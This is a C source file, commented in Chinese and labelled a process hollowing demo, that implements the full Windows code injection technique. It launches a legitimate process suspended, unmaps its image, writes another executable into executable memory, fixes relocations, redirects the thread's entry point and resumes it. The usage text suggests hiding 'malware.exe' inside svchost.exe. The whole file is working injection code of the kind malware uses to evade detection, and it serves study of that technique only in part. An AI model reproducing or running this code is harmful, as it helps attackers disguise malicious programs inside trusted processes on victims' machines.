#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "internals.h"
#include "pe.h"

/**
 * 进程镂空主函数
 * @param pDestCmdLine 目标进程命令行（例如："notepad.exe"）
 * @param pSourceFile 源文件路径（要注入的程序）
 */
void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile) {
    printf("\n========== 进程镂空开始 ==========\n\n");

    // ===== 1. 创建挂起的目标进程 =====
    printf("[1] 创建挂起进程：%s\n", pDestCmdLine);

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (!CreateProcessA(
        NULL,
        pDestCmdLine,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,  // 挂起状态
        NULL,
        NULL,
        &si,
        &pi
    )) {
        printf("错误：创建进程失败，错误码：%d\n", GetLastError());
        return;
    }

    printf("    进程 PID：%d\n", pi.dwProcessId);
    printf("    进程句柄：0x%p\n", pi.hProcess);

    // ===== 2. 读取目标进程的 PEB =====
    printf("\n[2] 读取目标进程的 PEB\n");
    MY_PEB* pPEB = ReadRemotePEB(pi.hProcess);
    if (!pPEB) {
        printf("错误：读取 PEB 失败\n");
        TerminateProcess(pi.hProcess, 1);
        return;
    }
    printf("    镜像基址：0x%p\n", pPEB->ImageBaseAddress);

    // 读取目标进程的镜像信息
    PLOADED_IMAGE pDestImage = ReadRemoteImage(pi.hProcess, pPEB->ImageBaseAddress);
    if (!pDestImage) {
        printf("错误：读取目标镜像失败\n");
        free(pPEB);
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    // ===== 3. 打开并读取源文件 =====
    printf("\n[3] 打开源文件：%s\n", pSourceFile);

    HANDLE hFile = CreateFileA(
        pSourceFile,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("错误：打开源文件失败，错误码：%d\n", GetLastError());
        free(pDestImage);
        free(pPEB);
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    DWORD dwFileSize = GetFileSize(hFile, NULL);
    printf("    文件大小：%d 字节\n", dwFileSize);

    PBYTE pBuffer = (PBYTE)malloc(dwFileSize);
    if (!pBuffer) {
        printf("错误：分配文件缓冲区失败\n");
        CloseHandle(hFile);
        free(pDestImage);
        free(pPEB);
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    DWORD dwBytesRead = 0;
    if (!ReadFile(hFile, pBuffer, dwFileSize, &dwBytesRead, NULL)) {
        printf("错误：读取文件失败\n");
        free(pBuffer);
        CloseHandle(hFile);
        free(pDestImage);
        free(pPEB);
        TerminateProcess(pi.hProcess, 1);
        return;
    }
    CloseHandle(hFile);

    // 获取源镜像信息
    PLOADED_IMAGE pSourceImage = GetLoadedImage(pBuffer);
    PIMAGE_NT_HEADERS pSourceHeaders = GetNTHeaders(pBuffer);

    printf("    源镜像基址：0x%p\n", (PVOID)pSourceHeaders->OptionalHeader.ImageBase);
    printf("    入口点：0x%X\n", pSourceHeaders->OptionalHeader.AddressOfEntryPoint);

    // ===== 4. 卸载目标进程的镜像 =====
    printf("\n[4] 卸载目标进程镜像\n");

    HMODULE hNTDLL = GetModuleHandleA("ntdll.dll");
    _NtUnmapViewOfSection NtUnmapViewOfSection =
        (_NtUnmapViewOfSection)GetProcAddress(hNTDLL, "NtUnmapViewOfSection");

    if (!NtUnmapViewOfSection) {
        printf("错误：获取 NtUnmapViewOfSection 失败\n");
        free(pSourceImage);
        free(pBuffer);
        free(pDestImage);
        free(pPEB);
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    NTSTATUS status = NtUnmapViewOfSection(pi.hProcess, pPEB->ImageBaseAddress);
    if (status != 0) {
        printf("错误：卸载镜像失败，状态码：0x%X\n", status);
        free(pSourceImage);
        free(pBuffer);
        free(pDestImage);
        free(pPEB);
        TerminateProcess(pi.hProcess, 1);
        return;
    }
    printf("    镜像已卸载\n");

    // ===== 5. 在目标进程中分配新内存 =====
    printf("\n[5] 分配新内存\n");

    PVOID pRemoteImage = VirtualAllocEx(
        pi.hProcess,
        pPEB->ImageBaseAddress,  // 尝试在原地址分配
        pSourceHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!pRemoteImage) {
        printf("错误：分配内存失败，错误码：%d\n", GetLastError());
        free(pSourceImage);
        free(pBuffer);
        free(pDestImage);
        free(pPEB);
        TerminateProcess(pi.hProcess, 1);
        return;
    }
    printf("    分配地址：0x%p\n", pRemoteImage);
    printf("    分配大小：%d 字节\n", pSourceHeaders->OptionalHeader.SizeOfImage);

    // ===== 6. 计算基址差值（用于重定位）=====
    ULONG_PTR ulpDelta = (ULONG_PTR)pRemoteImage - (ULONG_PTR)pSourceHeaders->OptionalHeader.ImageBase;
    printf("\n[6] 基址重定位\n");
    printf("    源镜像基址：0x%p\n", (PVOID)(ULONG_PTR)pSourceHeaders->OptionalHeader.ImageBase);
    printf("    目标镜像基址：0x%p\n", pRemoteImage);
    printf("    重定位差值：0x%llX\n", (unsigned long long)ulpDelta);

    // 更新 ImageBase
    pSourceHeaders->OptionalHeader.ImageBase = (ULONG_PTR)pRemoteImage;

    // ===== 7. 写入 PE 头 =====
    printf("\n[7] 写入 PE 头\n");

    if (!WriteProcessMemory(
        pi.hProcess,
        pRemoteImage,
        pBuffer,
        pSourceHeaders->OptionalHeader.SizeOfHeaders,
        NULL
    )) {
        printf("错误：写入 PE 头失败\n");
        free(pSourceImage);
        free(pBuffer);
        free(pDestImage);
        free(pPEB);
        TerminateProcess(pi.hProcess, 1);
        return;
    }
    printf("    PE 头已写入，大小：%d 字节\n", pSourceHeaders->OptionalHeader.SizeOfHeaders);

    // ===== 8. 写入各个节 =====
    printf("\n[8] 写入节区\n");

    for (DWORD i = 0; i < pSourceImage->NumberOfSections; i++) {
        if (!pSourceImage->Sections[i].PointerToRawData) {
            continue;
        }

        PVOID pSectionDest = (PVOID)((ULONG_PTR)pRemoteImage + pSourceImage->Sections[i].VirtualAddress);

        printf("    写入节：%-8s -> 0x%p (%d 字节)\n",
            pSourceImage->Sections[i].Name,
            pSectionDest,
            pSourceImage->Sections[i].SizeOfRawData
        );

        if (!WriteProcessMemory(
            pi.hProcess,
            pSectionDest,
            &pBuffer[pSourceImage->Sections[i].PointerToRawData],
            pSourceImage->Sections[i].SizeOfRawData,
            NULL
        )) {
            printf("错误：写入节失败\n");
        }
    }

    // ===== 9. 进行基址重定位 =====
    if (ulpDelta != 0) {
        printf("\n[9] 进行基址重定位（差值非零）\n");

        // 查找 .reloc 节
        BOOL bFoundReloc = FALSE;
        for (DWORD i = 0; i < pSourceImage->NumberOfSections; i++) {
            if (memcmp(pSourceImage->Sections[i].Name, ".reloc", 6) == 0) {
                bFoundReloc = TRUE;
                printf("    找到 .reloc 节\n");

                DWORD dwRelocAddr = pSourceImage->Sections[i].PointerToRawData;
                DWORD dwOffset = 0;

                IMAGE_DATA_DIRECTORY relocData =
                    pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

                printf("    重定位表大小：%d 字节\n", relocData.Size);

                DWORD dwRelocCount = 0;
                while (dwOffset < relocData.Size) {
                    PBASE_RELOCATION_BLOCK pBlock =
                        (PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];

                    dwOffset += sizeof(BASE_RELOCATION_BLOCK);

                    DWORD dwEntryCount = CountRelocationEntries(pBlock->BlockSize);
                    PBASE_RELOCATION_ENTRY pEntries =
                        (PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];

                    for (DWORD j = 0; j < dwEntryCount; j++) {
                        dwOffset += sizeof(BASE_RELOCATION_ENTRY);

                        if (pEntries[j].Type == 0) {
                            continue;  // 跳过填充项
                        }

                        DWORD dwFieldAddress = pBlock->PageAddress + pEntries[j].Offset;

                        // 对于 32 位应用，使用 DWORD；64 位使用 ULONGLONG
                        #ifdef _WIN64
                            ULONGLONG ullBuffer = 0;
                            ReadProcessMemory(
                                pi.hProcess,
                                (PVOID)((ULONG_PTR)pRemoteImage + dwFieldAddress),
                                &ullBuffer,
                                sizeof(ULONGLONG),
                                NULL
                            );

                            ullBuffer += ulpDelta;

                            if (!WriteProcessMemory(
                                pi.hProcess,
                                (PVOID)((ULONG_PTR)pRemoteImage + dwFieldAddress),
                                &ullBuffer,
                                sizeof(ULONGLONG),
                                NULL
                            )) {
                                printf("错误：重定位写入失败\n");
                            }
                        #else
                            DWORD dwBuffer = 0;
                            ReadProcessMemory(
                                pi.hProcess,
                                (PVOID)((ULONG_PTR)pRemoteImage + dwFieldAddress),
                                &dwBuffer,
                                sizeof(DWORD),
                                NULL
                            );

                            dwBuffer += (DWORD)ulpDelta;

                            if (!WriteProcessMemory(
                                pi.hProcess,
                                (PVOID)((ULONG_PTR)pRemoteImage + dwFieldAddress),
                                &dwBuffer,
                                sizeof(DWORD),
                                NULL
                            )) {
                                printf("错误：重定位写入失败\n");
                            }
                        #endif

                        dwRelocCount++;
                    }
                }

                printf("    已完成 %d 个重定位项\n", dwRelocCount);
                break;
            }
        }

        if (!bFoundReloc) {
            printf("    警告：未找到 .reloc 节\n");
        }
    } else {
        printf("\n[9] 无需基址重定位（差值为零）\n");
    }

    // ===== 10. 设置线程上下文 =====
    printf("\n[10] 设置线程上下文\n");

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_INTEGER;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("错误：获取线程上下文失败\n");
        free(pSourceImage);
        free(pBuffer);
        free(pDestImage);
        free(pPEB);
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    ULONG_PTR ulpEntryPoint = (ULONG_PTR)pRemoteImage + pSourceHeaders->OptionalHeader.AddressOfEntryPoint;

    // 32 位程序使用 Eax，64 位程序使用 Rcx
    #ifdef _WIN64
        ctx.Rcx = ulpEntryPoint;
    #else
        ctx.Eax = (DWORD)ulpEntryPoint;
    #endif

    printf("    入口点地址：0x%p\n", (PVOID)ulpEntryPoint);

    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("错误：设置线程上下文失败\n");
        free(pSourceImage);
        free(pBuffer);
        free(pDestImage);
        free(pPEB);
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    // ===== 11. 恢复线程 =====
    printf("\n[11] 恢复线程执行\n");

    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        printf("错误：恢复线程失败\n");
        free(pSourceImage);
        free(pBuffer);
        free(pDestImage);
        free(pPEB);
        TerminateProcess(pi.hProcess, 1);
        return;
    }

    printf("\n========== 进程镂空完成 ==========\n");

    // 清理资源
    free(pSourceImage);
    free(pBuffer);
    free(pDestImage);
    free(pPEB);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

/**
 * 主函数
 */
int main(int argc, char* argv[]) {
    printf("======================================\n");
    printf("      进程镂空技术演示程序\n");
    printf("      Process Hollowing Demo\n");
    printf("======================================\n");

    if (argc < 3) {
        printf("\n用法：%s <目标进程> <源程序路径>\n", argv[0]);
        printf("\n示例：\n");
        printf("  %s notepad.exe payload.exe\n", argv[0]);
        printf("  %s svchost.exe malware.exe\n", argv[0]);
        printf("\n说明：\n");
        printf("  目标进程：将被镂空的合法进程（如 notepad.exe）\n");
        printf("  源程序：要注入执行的程序路径\n");
        return 1;
    }

    char* pDestCmdLine = argv[1];
    char* pSourceFile = argv[2];

    // 执行进程镂空
    CreateHollowedProcess(pDestCmdLine, pSourceFile);

    printf("\n按任意键退出...\n");
    getchar();

    return 0;
}
